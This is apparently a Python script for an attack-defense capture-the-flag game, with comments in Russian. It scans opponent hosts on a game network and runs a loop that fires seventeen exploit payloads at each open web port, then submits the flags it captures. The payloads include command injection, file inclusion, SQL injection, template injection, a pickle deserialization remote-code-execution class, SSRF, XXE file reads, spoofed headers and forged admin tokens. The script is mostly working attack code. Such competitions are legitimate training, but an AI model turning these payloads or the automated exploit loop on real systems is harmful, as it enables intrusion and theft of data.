# ============================================================
#  МОЙ СКАНЕР + ОХОТА  (скан портов + ВСЕ 17 дыр)
# ------------------------------------------------------------
#  Отличие от myfarm: сначала СКАНИТ, на каких портах живёт сервис
#  (вдруг защита перенесла его), а потом на найденном http-порту
#  пробует ВСЕ 17 дыр и берёт флаг из любой открытой.
#
#  Запуск: python3 mydiscover.py    Стоп: Ctrl+C
#  ГДЕ МЕНЯТЬ  ->  метка   <<< МЕНЯТЬ ЗДЕСЬ
# ============================================================

import socket
import urllib.request
import urllib.parse
import re
import time
import os
import base64
import json
import pickle
import subprocess


# --- РЕЖИМ РАБОТЫ ---
#  БОЕВОЙ: ничего не задаёшь — сам найдёт цели (10.248.<все кроме своей>.2), приём 10.248.0.6.
#  ТЕСТ/ЛАБА: задаёшь CTF_TARGETS и CTF_SUBMIT_HOST — берутся они.
submit_ip = os.environ.get("CTF_SUBMIT_HOST", "10.248.0.6")        # боевой сервер приёма
submit_port = int(os.environ.get("CTF_SUBMIT_PORT", "6666"))

# все игровые порты — сканим их (вдруг сервис переехал)
http_ports = [3000, 8080, 5000, 1122, 1133, 1144, 12345]           # <<< МЕНЯТЬ ЗДЕСЬ
tcp_ports = [6789, 13731, 1337, 4441, 1234, 12346, 31337, 2222]    # <<< МЕНЯТЬ ЗДЕСЬ
pause = 5


def battle_targets():
    """Боевой режим: определить свой игровой IP и вернуть все команды, кроме своей."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect((submit_ip, submit_port))
        myip = s.getsockname()[0]
        s.close()
        m = re.match(r"10\.248\.(\d+)\.", myip)
        if m:
            me = int(m.group(1))
            return ["10.248.%d.2" % t for t in range(1, 12) if t != me]
    except Exception:
        pass
    return []


_env = os.environ.get("CTF_TARGETS", "").strip()
if _env:
    targets = [x.strip() for x in _env.split(",") if x.strip()]   # тест/лаба
else:
    targets = battle_targets()                                    # боевой (авто)
    if not targets:
        print("!! не вижу игровую сеть 10.248.x — поднят ли WireGuard?")

flag_pattern = "CNCTF[A-Za-z0-9]+"
already = []
fake_headers = [{}, {"X-Forwarded-For": "127.0.0.1"}, {"X-Real-IP": "127.0.0.1"}]


def find_flag(text):
    return re.findall(flag_pattern, text)


def enc(s):
    return urllib.parse.quote(s, safe="")


def is_open(ip, port):
    try:
        s = socket.socket()
        s.settimeout(1)
        s.connect((ip, port))
        s.close()
        return True
    except Exception:
        return False


# HTTP-GET с заголовками-обманки (+ можно добавить свой заголовок)
def http_get(ip, port, path, extra=None):
    text = ""
    for hdr in fake_headers:
        h = dict(hdr)
        if extra:
            h.update(extra)
        try:
            url = "http://" + ip + ":" + str(port) + path
            req = urllib.request.Request(url, headers=h)
            text += urllib.request.urlopen(req, timeout=3).read().decode(errors="replace")
        except Exception:
            pass
    return text


# HTTP-POST (для XXE)
def http_post(ip, port, path, body):
    try:
        url = "http://" + ip + ":" + str(port) + path
        req = urllib.request.Request(url, data=body.encode(), method="POST")
        return urllib.request.urlopen(req, timeout=3).read().decode(errors="replace")
    except Exception:
        return ""


# все 17 дыр на конкретном http-порту -> список флагов
def grab_http_all(ip, port):
    out = []
    # 1 открытый /flag
    out += find_flag(http_get(ip, port, "/flag"))
    # 2 command injection
    out += find_flag(http_get(ip, port, "/ping?host=" + enc("x;cat /tmp/flag.txt")))
    # 3 LFI
    out += find_flag(http_get(ip, port, "/read?file=/tmp/flag.txt"))
    # 4 SQL injection
    out += find_flag(http_get(ip, port, "/search?q=" + enc("' UNION SELECT flag FROM secret-- ")))
    # 5 SSTI
    out += find_flag(http_get(ip, port, "/hello?name=" + enc("{{flag}}")))
    # 6 IDOR
    for i in [0, 1, 2, 3]:
        out += find_flag(http_get(ip, port, "/note/" + str(i)))
    # 7 слабая авторизация
    for tok in ["letmein", "s3cr3t", "admin"]:
        out += find_flag(http_get(ip, port, "/admin?token=" + tok))
    # 8 утечка env
    out += find_flag(http_get(ip, port, "/debug"))
    # 9 десериализация pickle -> RCE
    class Evil:
        def __reduce__(self):
            return (subprocess.check_output, (["cat", "/tmp/flag.txt"],))
    data = base64.b64encode(pickle.dumps(Evil())).decode()
    out += find_flag(http_get(ip, port, "/load?data=" + enc(data)))
    # 11 SSRF
    for u in ["file:///tmp/flag.txt", "http://127.0.0.1:3000/flag"]:
        out += find_flag(http_get(ip, port, "/fetch?url=" + enc(u)))
    # 12 утечка бэкапа
    out += find_flag(http_get(ip, port, "/backup"))
    # 13 слабый токен (base64 json admin=true)
    apitok = base64.b64encode(json.dumps({"admin": True}).encode()).decode()
    out += find_flag(http_get(ip, port, "/api?token=" + enc(apitok)))
    # 14 обход по заголовку
    out += find_flag(http_get(ip, port, "/internal", extra={"X-Internal": "1"}))
    # 15 слабая крипта (XOR по известному началу флага)
    status = http_get(ip, port, "/status")
    for part in status.split("enc: ")[1:]:
        try:
            eb = base64.b64decode(part.split()[0])
            key = bytes(eb[i] ^ b"CNCTF"[i] for i in range(min(5, len(eb))))
            dec = bytes(eb[i] ^ key[i % len(key)] for i in range(len(eb)))
            out += find_flag(dec.decode(errors="replace"))
        except Exception:
            pass
    # 16 XXE
    xml = ('<?xml version="1.0"?>'
           '<!DOCTYPE x [<!ENTITY e SYSTEM "file:///tmp/flag.txt">]>'
           '<data>&e;</data>')
    out += find_flag(http_post(ip, port, "/xml", xml))
    # 17 race /gift (несколько попыток, ловим окно)
    for _ in range(4):
        out += find_flag(http_get(ip, port, "/gift"))
    return out


# 10 TCP выдача
def grab_tcp(ip, port):
    out = []
    for cmd in [b"flag\n", b"FLAG\n"]:
        try:
            s = socket.socket()
            s.settimeout(3)
            s.connect((ip, port))
            s.recv(1024)
            s.send(cmd)
            out += find_flag(s.recv(2048).decode(errors="replace"))
            s.close()
        except Exception:
            pass
    return out


def send_flag(flag):
    try:
        s = socket.socket()
        s.settimeout(5)
        s.connect((submit_ip, submit_port))
        s.send((flag + "\n").encode())
        answer = s.recv(1024).decode().strip()
        s.close()
        print("   сдаю", flag, "->", answer)
    except Exception as e:
        print("   не смог сдать:", e)


# --- ГЛАВНЫЙ ЦИКЛ ---
print("сканер-охотник пошёл (17 дыр). цели:", targets)

while True:
    for ip in targets:
        ip = ip.strip()
        open_http = [p for p in http_ports if is_open(ip, p)]
        open_tcp = [p for p in tcp_ports if is_open(ip, p)]
        print("--- ", ip, " http:", open_http, " tcp:", open_tcp)

        flags = []
        for p in open_http:
            flags += grab_http_all(ip, p)
        for p in open_tcp:
            flags += grab_tcp(ip, p)

        for f in set(flags):
            if f not in already:
                already.append(f)
                send_flag(f)
    time.sleep(pause)
